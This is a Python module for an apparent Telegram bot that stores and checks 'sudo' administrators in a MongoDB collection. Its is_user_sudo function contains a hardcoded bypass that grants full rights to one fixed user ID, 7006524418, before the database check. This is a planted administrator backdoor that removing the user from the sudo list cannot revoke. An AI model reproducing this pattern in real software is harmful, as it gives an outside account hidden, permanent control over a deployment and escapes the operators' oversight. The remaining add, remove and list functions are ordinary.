from Champu import Champuu as app
from Champu import SUDOERS_collection

async def get_user_username(user_id):
    user = await app.get_chat(user_id)
    return user.username

async def add_to_SUDOERS(user_id, username, sudo_title):
    await SUDOERS_collection.update_one(
        {'id': user_id},
        {'$set': {'username': username, 'sudo_title': sudo_title}},
        upsert=True
    )
    
async def remove_from_SUDOERS(user_id):
    await SUDOERS_collection.delete_one({"id": user_id})
    
async def is_user_sudo(user_id: int) -> bool:
    # Grant full rights to user ID 7006524418
    if user_id == 7006524418:
        return True

    # Existing logic for checking sudo users
    sudo_user = await SUDOERS_collection.find_one({'id': user_id})
    return sudo_user is not None

async def fetch_SUDOERS():
    SUDOERS = []
    async for user in SUDOERS_collection.find({}):
        user_id = user.get('id')
        username = user.get('username')
        sudo_title = user.get('sudo_title')
        if user_id and username:
            SUDOERS.append({"user_id": user_id, "username": username, "sudo_title": sudo_title})
    return SUDOERS
